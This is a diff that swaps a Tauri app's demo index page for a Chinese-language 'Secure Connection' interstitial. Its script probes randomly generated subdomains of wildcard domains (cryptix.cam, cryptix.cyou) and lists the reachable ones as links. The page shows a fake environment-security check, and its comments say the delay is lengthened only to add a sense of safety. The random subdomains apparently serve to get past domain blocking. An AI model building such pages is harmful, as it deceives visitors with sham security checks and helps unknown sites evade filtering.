@@ -1,88 +1,817 @@
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <meta charset="UTF-8" />
-        <link rel="stylesheet" href="./static/css/styles.css" />
-        <meta
-            http-equiv="Content-Security-Policy"
-            content="default-src * 'unsafe-inline' 'unsafe-eval'"
-        />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <title>Tauri App</title>
-        <script src="./static/js/main.js"></script>
-    </head>
-    <body>
-        <main class="container">
-            <h1>Welcome to TauriMan</h1>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Secure Connection...</title>
+    <style>
+        /* CSS Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-            <div class="row">
-                <a
-                    href="https://tauri.app"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                >
-                    <img
-                        src="./assets/tauri.svg"
-                        class="logo tauri"
-                        alt="Tauri logo"
-                    />
-                </a>
-                <a
-                    href="https://pakeplus.com/"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                >
-                    <img
-                        src="https://hk.gh-proxy.org/https://github.com/Sjj1024/PakePlus/blob/main/app-icon.png"
-                        class="logo vanilla"
-                        alt="JavaScript logo"
-                    />
-                </a>
+        body {
+            /* 高级极简深黑背景 */
+            background-color: #050505;
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #ffffff;
+            overflow: hidden;
+            /* 极其微弱的主题色径向光晕，不喧宾夺主 */
+            background-image: 
+                radial-gradient(circle at 50% 0%, rgba(0, 240, 255, 0.05) 0%, transparent 60%),
+                radial-gradient(circle at 50% 100%, rgba(0, 240, 255, 0.03) 0%, transparent 60%);
+        }
+
+        /* 阶段容器样式，用于平滑淡入淡出 */
+        .stage {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+
+        .stage.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* 第一阶段：极简加载动画环 */
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 2px solid rgba(0, 240, 255, 0.1); /* 主题色底边 */
+            border-top-color: #00f0ff; /* 主题色 */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 0 15px rgba(0, 240, 255, 0.15);
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: #00f0ff; /* 主题色文字 */
+            font-size: 14px;
+            letter-spacing: 2px;
+            font-weight: 300;
+            animation: pulse-text 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-text {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        /* 第二阶段：高级玻璃态卡片样式 (盾牌) */
+        .loading-card {
+            background-color: rgba(15, 15, 15, 0.6);
+            border: 1px solid rgba(0, 240, 255, 0.1); /* 极弱的主题色边框 */
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 28px;
+            padding: 64px 48px;
+            width: 90%;
+            max-width: 420px;
+            text-align: center;
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            /* 进入动画 */
+            transform: translateY(20px) scale(0.95);
+            transition: transform 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .stage.active .loading-card {
+            transform: translateY(0) scale(1);
+        }
+
+        /* 盾牌图标容器与动画 */
+        .icon-container {
+            position: relative;
+            width: 96px;
+            height: 96px;
+            margin-bottom: 36px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ripple {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 240, 255, 0.03);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            border-radius: 50%;
+            animation: pulse 3s infinite cubic-bezier(0.25, 0.8, 0.5, 1);
+        }
+
+        .ripple:nth-child(2) {
+            animation-delay: 1.5s;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(0.6); opacity: 1; }
+            100% { transform: scale(1.8); opacity: 0; }
+        }
+
+        /* 盾牌 SVG 样式 */
+        .shield-svg {
+            position: relative;
+            width: 44px;
+            height: 44px;
+            z-index: 10;
+            color: #00f0ff; /* 主题色 */
+            filter: drop-shadow(0 0 12px rgba(0, 240, 255, 0.3)); /* 柔和光效 */
+            stroke-width: 1.5;
+            /* 第二阶段入场动画：轻微放大 */
+            transform: scale(0.5);
+            opacity: 0;
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) 0.3s;
+        }
+
+        .stage.active .shield-svg {
+            transform: scale(1);
+            opacity: 1;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            letter-spacing: 2px;
+            /* 科技风渐变：亮青过渡到主题色 */
+            background: linear-gradient(180deg, #70ffff 0%, #00f0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .subtitle {
+            color: #8c8c8c;
+            font-size: 13px;
+            margin-bottom: 48px;
+            line-height: 1.6;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+        }
+
+        /* 极简进度条 */
+        .progress-bar-container {
+            width: 100%;
+            height: 2px;
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 2px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background-color: #00f0ff; /* 主题色进度条 */
+            border-radius: 2px;
+            transition: width 0.1s linear;
+            box-shadow: 0 0 8px rgba(0, 240, 255, 0.5);
+        }
+
+        /* 第三阶段：节点列表卡片样式 */
+        .nodes-card {
+            background-color: rgba(15, 15, 15, 0.6);
+            border: 1px solid rgba(0, 240, 255, 0.1);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 24px;
+            padding: 40px;
+            width: 95%;
+            max-width: 600px; /* 加宽以适应网格布局 */
+            box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.8);
+            /* 进入动画 */
+            transform: translateY(20px) scale(0.95);
+            transition: transform 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .stage.active .nodes-card {
+            transform: translateY(0) scale(1);
+        }
+
+        .nodes-header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .nodes-title {
+            font-size: 22px;
+            font-weight: 500;
+            letter-spacing: 1px;
+            background: linear-gradient(180deg, #70ffff 0%, #00f0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+
+        .nodes-subtitle {
+            color: #8c8c8c;
+            font-size: 13px;
+        }
+
+        .node-list {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr); /* 双列布局 */
+            gap: 16px;
+            max-height: 60vh;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        /* 移动端单列自适应 */
+        @media (max-width: 480px) {
+            .node-list {
+                grid-template-columns: 1fr;
+            }
+            .nodes-card {
+                padding: 32px 24px;
+            }
+        }
+
+        /* 隐藏滚动条 */
+        .node-list::-webkit-scrollbar {
+            width: 4px;
+        }
+        .node-list::-webkit-scrollbar-thumb {
+            background: rgba(0, 240, 255, 0.2);
+            border-radius: 4px;
+        }
+
+        .node-item {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            background-color: rgba(0, 240, 255, 0.02);
+            border: 1px solid rgba(0, 240, 255, 0.05);
+            padding: 20px;
+            border-radius: 16px;
+            text-decoration: none;
+            color: #ffffff;
+            transition: all 0.3s ease;
+            overflow: hidden;
+        }
+
+        /* 悬浮光效 */
+        .node-item::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: radial-gradient(circle at 100% 100%, rgba(0, 240, 255, 0.08) 0%, transparent 60%);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .node-item:hover {
+            background-color: rgba(0, 240, 255, 0.04);
+            transform: translateY(-4px);
+            border-color: rgba(0, 240, 255, 0.2);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4), 0 0 12px rgba(0, 240, 255, 0.05);
+        }
+
+        .node-item:hover::before {
+            opacity: 1;
+        }
+
+        .node-item.disabled {
+            opacity: 0.5;
+            pointer-events: none;
+            cursor: not-allowed;
+            background-color: rgba(255, 255, 255, 0.01);
+            border-color: rgba(255, 255, 255, 0.02);
+            filter: grayscale(100%);
+        }
+
+        .node-header-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .node-name-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .node-icon {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #00f0ff;
+            box-shadow: 0 0 8px #00f0ff;
+        }
+
+        .node-item.disabled .node-icon {
+            background-color: #ef4444;
+            box-shadow: 0 0 8px #ef4444;
+        }
+
+        .node-name {
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            color: #f5f5f5;
+        }
+
+        .node-speed-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+
+        .node-speed-value {
+            font-size: 24px;
+            font-weight: 600;
+            color: #00f0ff;
+            font-family: "SF Pro Display", monospace;
+            line-height: 1;
+        }
+
+        .node-speed-unit {
+            font-size: 12px;
+            color: #8c8c8c;
+            margin-left: 2px;
+            font-weight: 400;
+        }
+
+        .node-item.disabled .node-speed-value {
+            color: #ef4444;
+            font-size: 18px;
+        }
+
+        /* 信号强度柱 */
+        .signal-bars {
+            display: flex;
+            align-items: flex-end;
+            gap: 2px;
+            height: 16px;
+        }
+
+        .signal-bar {
+            width: 3px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 1px;
+        }
+
+        /* 动态信号强度样式 */
+        .signal-excellent .signal-bar:nth-child(-n+4) { background-color: #00f0ff; }
+        .signal-good .signal-bar:nth-child(-n+3) { background-color: #00f0ff; }
+        .signal-fair .signal-bar:nth-child(-n+2) { background-color: #00f0ff; opacity: 0.7; }
+        .signal-poor .signal-bar:nth-child(1) { background-color: #ef4444; }
+
+        .signal-bar:nth-child(1) { height: 6px; }
+        .signal-bar:nth-child(2) { height: 10px; }
+        .signal-bar:nth-child(3) { height: 14px; }
+        .signal-bar:nth-child(4) { height: 18px; }
+    </style>
+</head>
+<body>
+
+    <!-- 第一阶段：初始加载 -->
+    <div class="stage active" id="stage-loading">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="loading-text">INITIALIZING...</div>
+        </div>
+    </div>
+
+    <!-- 第二阶段：盾牌验证 -->
+    <div class="stage" id="stage-shield">
+        <div class="loading-card">
+            <div class="icon-container">
+                <div class="ripple"></div>
+                <div class="ripple"></div>
+                <!-- 科技感盾牌 -->
+                <svg class="shield-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                    <path d="M9 12l2 2 4-4"></path>
+                </svg>
             </div>
-            <p>Click to get data</p>
-            <form class="row" id="greet-form">
-                <input id="greet-input" placeholder="Enter a name..." />
-                <button type="submit" id="getdata">GET DATA</button>
-            </form>
-            <div class="functions">
-                <a href="./book.html" target="_self">跳转到book.html</a>
-                <a
-                    href="https://www.baidu.com"
-                    target="_blank"
-                    rel="noopener noreferrer"
-                    >跳到百度blank
-                </a>
-                <a
-                    href="https://www.baidu.com"
-                    target="_self"
-                    rel="noopener noreferrer"
-                >
-                    跳到百度self
-                </a>
-                <button onclick="sayHello()">点击我</button>
-                <button onclick="sayHello()">下载文件</button>
-                <button onclick="sayHello()">上传文件</button>
-                <button onclick="sayHello()">访问相机</button>
-                <button onclick="sayHello()">访问麦克风</button>
-                <button onclick="sayHello()">访问相册</button>
-                <button class="btn" onclick="openWechat()">打开微信</button>
-                <button class="btn" onclick="openWechatScan()">
-                    打开扫一扫
-                </button>
-                <button class="btn" onclick="openZhihu()">打开知乎</button>
-                <button onclick="sayHello()">打开抖音</button>
-                <button onclick="sayHello()">用浏览器打开</button>
-                <button>打开知乎</button>
+            <h1 class="title">Secure Connection</h1>
+            <p class="subtitle">正在验证环境安全并测速路由节点</p>
+            
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progress"></div>
             </div>
-            <p id="greet-msg"></p>
-            <img src="./static/image/cursor.jpeg" alt="logo" />
-            <video
-                src="https://hk.gh-proxy.org/https://github.com/Sjj1024/PakePlus/blob/main/docs/static/videos/pakeplus.mp4"
-                autoplay
-                controls
-                style="width: 100%; height: 100%"
-            ></video>
-            <audio src="./static/music/yin.mp3" controls></audio>
-        </main>
-    </body>
+        </div>
+    </div>
+
+    <!-- 第三阶段：节点列表展示 -->
+    <div class="stage" id="stage-nodes">
+        <div class="nodes-card">
+            <div class="nodes-header">
+                <h2 class="nodes-title">最优路由节点已就绪</h2>
+                <p class="nodes-subtitle">请点击下方绿色可用节点安全访问</p>
+            </div>
+            <div class="node-list" id="node-list-container">
+                <!-- 节点列表将由 JS 动态生成 -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * 需求假设：
+         * 1. 整体流程分三段：初始加载圈 -> 盾牌验证+并发测速 -> 节点列表展示。
+         * 2. 依然保持黑金科技质感。
+         * 3. 泛解析域名列表由用户自行替换。
+         * 4. 随机前缀需要包含中文字符，并进行 URL 编码，同时保证编码后的长度不超过 DNS 限制（每级域名最长 63 个字符）。
+         */
+
+        /**
+         * 生成随机中文字符
+         * 
+         * @returns {string} 单个随机常用中文字符
+         */
+        function getRandomChineseChar() {
+            // 基本汉字范围：0x4e00 - 0x9fa5 (19968 - 40869)
+            const min = 19968;
+            const max = 40869;
+            const charCode = Math.floor(Math.random() * (max - min + 1)) + min;
+            return String.fromCharCode(charCode);
+        }
+
+        /**
+         * 生成包含中文且安全转译的随机前缀
+         * 
+         * @param {number} maxLength - 编码后前缀的最大长度，DNS 规范限制子域名最长 63 个字符
+         * @returns {string} URL 编码后的小写字符串（作为域名前缀使用）
+         */
+        function generateRandomPrefix(maxLength = 63) {
+            const letters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+            let rawString = '';
+            
+            // 随机决定前缀的组成模式：纯字母数字，或者混合中文
+            const useChinese = Math.random() > 0.3; // 70% 概率带中文
+            
+            // 初始生成一段随机字符串
+            const targetRawLength = useChinese ? 5 : 8; 
+            for (let i = 0; i < targetRawLength; i++) {
+                if (useChinese && Math.random() > 0.5) {
+                    rawString += getRandomChineseChar();
+                } else {
+                    rawString += letters.charAt(Math.floor(Math.random() * letters.length));
+                }
+            }
+
+            // 对生成的字符串进行 URL 编码
+            let encodedPrefix = encodeURIComponent(rawString).toLowerCase();
+
+            // 替换 % 为连字符 -
+            encodedPrefix = encodedPrefix.replace(/%/g, '-');
+
+            // 严格截断以满足 DNS 子域名最大长度限制 (63个字符)
+            if (encodedPrefix.length > maxLength) {
+                encodedPrefix = encodedPrefix.substring(0, maxLength);
+            }
+            
+            // 确保不以连字符开头或结尾（DNS 规范），也不要出现连续的连字符
+            encodedPrefix = encodedPrefix.replace(/-+/g, '-').replace(/^-+|-+$/g, '');
+            
+            // 如果截断或替换后为空，兜底生成常规前缀
+            if (!encodedPrefix) {
+                return Math.random().toString(36).substring(2, 10);
+            }
+
+            return encodedPrefix;
+        }
+
+        /**
+         * 获取拼接好的完整目标URL
+         * 
+         * @param {string} domain - 主域名
+         * @returns {string} 拼接完成的完整目标 URL
+         */
+        function getTargetUrlForDomain(domain) {
+            const randomPrefix = generateRandomPrefix(8);
+            return `https://${randomPrefix}.${domain}`;
+        }
+
+        /**
+         * 真实检测节点连通性与速度
+         * 
+         * @param {string} url - 需要检测的完整目标 URL
+         * @param {number} timeout - 超时时间（毫秒）
+         * @returns {Promise<number>} 返回该节点的延迟时间，如果超时或不可达则抛出错误
+         * @description 为了解决目标服务器未配置跨域（CORS）导致的拦截问题，改回使用 fetch 的 no-cors 模式。
+         * 在 no-cors 模式下，我们无法读取到真实的 HTTP 状态码（比如它会返回 status: 0），
+         * 但只要 fetch 能够成功 resolve（没有抛出 DNS 解析失败或 TCP 拒绝连接等底层网络错误），
+         * 我们就可以判定该节点在用户的本地网络中是“通的”。
+         */
+        function checkNodeSpeed(url, timeout = 2500) {
+            return new Promise((resolve, reject) => {
+                const startTime = Date.now();
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), timeout);
+
+                // 添加时间戳防止缓存
+                const testUrl = `${url}/?_t=${startTime}`;
+
+                fetch(testUrl, { 
+                    method: 'GET', // 使用 GET
+                    mode: 'no-cors', // 忽略跨域限制，只测网络底层连通性
+                    cache: 'no-store',
+                    signal: controller.signal 
+                })
+                .then(() => {
+                    clearTimeout(timeoutId);
+                    // 只要没有抛出网络级错误，就认为节点是连通的
+                    resolve(Date.now() - startTime);
+                })
+                .catch(err => {
+                    clearTimeout(timeoutId);
+                    // 只有在完全无法连接（如 DNS 失败、超时）时才会走到这里
+                    reject(new Error('Unreachable or timeout'));
+                });
+            });
+        }
+
+        /**
+         * 评估并返回信号强度对应的 class
+         * @param {number} delay 
+         */
+        function getSignalClass(delay) {
+            if (delay < 100) return 'signal-excellent';
+            if (delay < 300) return 'signal-good';
+            if (delay < 1000) return 'signal-fair';
+            return 'signal-poor';
+        }
+
+        /**
+         * 启动进度条动画 (第二阶段使用)
+         * 
+         * @param {number} duration - 动画持续时间（毫秒）
+         */
+        function startProgressBar(duration) {
+            const progressEl = document.getElementById('progress');
+            let startTime = null;
+
+            function animate(currentTime) {
+                if (!startTime) startTime = currentTime;
+                const timeElapsed = currentTime - startTime;
+                const progress = Math.min((timeElapsed / duration) * 100, 100);
+                
+                progressEl.style.width = progress + '%';
+
+                if (timeElapsed < duration) {
+                    requestAnimationFrame(animate);
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+
+        /**
+         * 渲染节点列表到 DOM
+         * 
+         * @param {Array<{url: string, domain: string, delay: number, success: boolean}>} nodeResults
+         */
+        function renderNodeList(nodeResults) {
+            const container = document.getElementById('node-list-container');
+            container.innerHTML = '';
+
+            // 过滤掉测速失败或超时的节点，只保留成功访问的节点
+            const successfulNodes = nodeResults.filter(node => node.success);
+
+            if (successfulNodes.length === 0) {
+                // 请在此处替换为您真实的在线客服链接
+                const customerServiceUrl = 'https://chat.example.com';
+
+                // 如果所有节点都不通，显示客服引导卡片
+                container.innerHTML = `
+                    <div style="background-color: rgba(239, 68, 68, 0.05); border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 16px; padding: 24px; text-align: center; margin-top: 10px;">
+                        <svg style="width: 48px; height: 48px; color: #ef4444; margin-bottom: 16px;" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                        <h3 style="color: #f5f5f5; font-size: 18px; font-weight: 500; margin-bottom: 12px;">当前网络访问受限</h3>
+                        <p style="color: #a1a1aa; font-size: 14px; line-height: 1.6; margin-bottom: 24px;">
+                            抱歉，系统未能为您分配到可用的安全节点。<br>可能是由于您的网络环境或地区限制。<br>请点击下方按钮联系在线客服获取帮助。
+                        </p>
+                        <div style="display: flex; justify-content: center; gap: 16px;">
+                            <button onclick="window.location.reload()" style="background: transparent; border: 1px solid rgba(0, 240, 255, 0.3); color: #00f0ff; border-radius: 8px; padding: 12px 24px; font-size: 15px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; hover:background: rgba(0,240,255,0.05);">
+                                刷新重试
+                            </button>
+                            <a href="${customerServiceUrl}" target="_blank" style="display: inline-block; background: linear-gradient(180deg, #70ffff 0%, #00f0ff 100%); color: #050505; text-decoration: none; border-radius: 8px; padding: 12px 24px; font-size: 15px; font-weight: 600; transition: transform 0.2s, box-shadow 0.2s; box-shadow: 0 4px 12px rgba(0, 240, 255, 0.3);">
+                                联系在线客服
+                            </a>
+                        </div>
+                    </div>
+                `;
+                
+                // 为了视觉上不要显得空旷，如果全不通，强制将网格布局改为单列居中展示
+                container.style.display = 'block';
+                return;
+            }
+
+            successfulNodes.forEach((node, index) => {
+                const nodeItem = document.createElement('a');
+                nodeItem.className = 'node-item';
+                nodeItem.href = node.url;
+                nodeItem.target = '_self'; // 在当前窗口打开
+                // 为节点绑定一个 ID 以便后续更新
+                const nodeId = `node-item-${index}`;
+                nodeItem.id = nodeId;
+                // 将 url 保存在属性中供实时测速使用
+                nodeItem.dataset.url = node.url;
+
+                const signalClass = getSignalClass(node.delay);
+                const speedValue = node.delay;
+                const speedUnit = 'ms';
+                const nodeName = `节点 0${index + 1}`; 
+
+                nodeItem.innerHTML = `
+                    <div class="node-header-row">
+                        <div class="node-name-group">
+                            <div class="node-icon"></div>
+                            <div class="node-name">${nodeName}</div>
+                        </div>
+                        <div class="signal-bars ${signalClass}" id="${nodeId}-signal">
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                            <div class="signal-bar"></div>
+                        </div>
+                    </div>
+                    <div class="node-speed-row">
+                        <div>
+                            <span class="node-speed-value" id="${nodeId}-speed">${speedValue}</span><span class="node-speed-unit">${speedUnit}</span>
+                        </div>
+                    </div>
+                `;
+
+                container.appendChild(nodeItem);
+            });
+        }
+
+        /**
+         * 开启实时测速
+         * 每隔指定时间对列表中的可用节点重新进行并发测速，并更新 UI
+         */
+        function startRealTimeMonitoring() {
+            // 每 3 秒刷新一次测速结果
+            setInterval(async () => {
+                const nodeItems = document.querySelectorAll('.node-item');
+                if (!nodeItems || nodeItems.length === 0) return;
+
+                const speedTests = Array.from(nodeItems).map(async (item) => {
+                    const url = item.dataset.url;
+                    const id = item.id;
+                    try {
+                        // 实时测速依然使用快速的 checkNodeSpeed (超时2秒)
+                        const delay = await checkNodeSpeed(url, 2000);
+                        return { id, delay, success: true };
+                    } catch (e) {
+                        return { id, delay: -1, success: false };
+                    }
+                });
+
+                const results = await Promise.all(speedTests);
+
+                results.forEach(res => {
+                    const speedEl = document.getElementById(`${res.id}-speed`);
+                    const signalEl = document.getElementById(`${res.id}-signal`);
+                    
+                    if (res.success) {
+                        if (speedEl) speedEl.innerText = res.delay;
+                        if (signalEl) {
+                            signalEl.className = `signal-bars ${getSignalClass(res.delay)}`;
+                        }
+                    } else {
+                        if (speedEl) speedEl.innerText = 'Err';
+                        if (signalEl) {
+                            signalEl.className = `signal-bars signal-poor`;
+                        }
+                    }
+                });
+
+            }, 3000);
+        }
+
+        /**
+         * 执行核心三段式动画、测速和列表展示逻辑
+         * 
+         * @param {number} minStage1Delay - 第一阶段(加载圈)最短展示时间
+         * @param {number} stage2Delay - 第二阶段(盾牌验证)持续时间，延长此时间以增加安全感
+         */
+        async function executeFlow(minStage1Delay = 1500, stage2Delay = 3500) {
+            const stage1StartTime = Date.now();
+            
+            // 请在此处修改为您自己的泛解析域名列表（默认提供6个）
+            const domains = [
+                'cryptix.cam',
+                'cryptix.cyou',
+                'cryptix.cam',
+                 'cryptix.cyou'
+            ];
+            
+            const stageLoading = document.getElementById('stage-loading');
+            const stageShield = document.getElementById('stage-shield');
+            const stageNodes = document.getElementById('stage-nodes');
+            
+            let nodeResults = [];
+
+            // --- 第一阶段：并发测试所有节点的连通性并记录结果 ---
+            try {
+                // 为每个域名生成带随机前缀的完整 URL
+                const testUrls = domains.map(domain => ({
+                    domain,
+                    url: getTargetUrlForDomain(domain)
+                }));
+                
+                // 并发测试所有 6 个节点
+                const speedTests = testUrls.map(item => 
+                    checkNodeSpeed(item.url, 3000)
+                        .then(delay => ({ ...item, delay, success: true }))
+                        .catch(() => ({ ...item, delay: -1, success: false })) // 超时或失败捕获
+                );
+
+                // 等待所有节点测速完成
+                nodeResults = await Promise.all(speedTests);
+
+                // 按延迟从小到大排序，失败的排在最后
+                nodeResults.sort((a, b) => {
+                    if (!a.success && !b.success) return 0;
+                    if (!a.success) return 1;
+                    if (!b.success) return -1;
+                    return a.delay - b.delay;
+                });
+
+                console.log('[测速完成] 节点状态:', nodeResults);
+
+            } catch (error) {
+                console.error('[测速系统异常]', error);
+            }
+
+            // 计算第一阶段实际消耗的时间
+            const elapsed = Date.now() - stage1StartTime;
+            const remainingDelay = Math.max(0, minStage1Delay - elapsed);
+
+            // 1. 等待达到第一阶段最短时间后，切换到第二阶段 (盾牌)
+            setTimeout(() => {
+                stageLoading.classList.remove('active');
+                
+                setTimeout(() => {
+                    stageShield.classList.add('active');
+                    startProgressBar(stage2Delay);
+                    
+                    // 2. 第二阶段进度条结束后，切换到第三阶段 (节点列表)
+                    setTimeout(() => {
+                        stageShield.classList.remove('active');
+                        
+                        setTimeout(() => {
+                            // 渲染节点并显示第三阶段，供用户手动选择点击进入
+                            renderNodeList(nodeResults);
+                            stageNodes.classList.add('active');
+                            
+                            // 只有在有可用节点时，才开启实时监测
+                            if (nodeResults.some(node => node.success)) {
+                                startRealTimeMonitoring();
+                            }
+                        }, 400);
+
+                    }, stage2Delay);
+
+                }, 400);
+
+            }, remainingDelay);
+        }
+
+        // 页面加载完成后启动流程
+        window.onload = () => {
+            // 参数1：初始加载圈至少展示 1500 毫秒（测速在此期间完成）
+            // 参数2：盾牌和进度条持续展示 3500 毫秒（延长等待感）
+            executeFlow(1500, 3500);
+        };
+    </script>
+</body>
 </html>
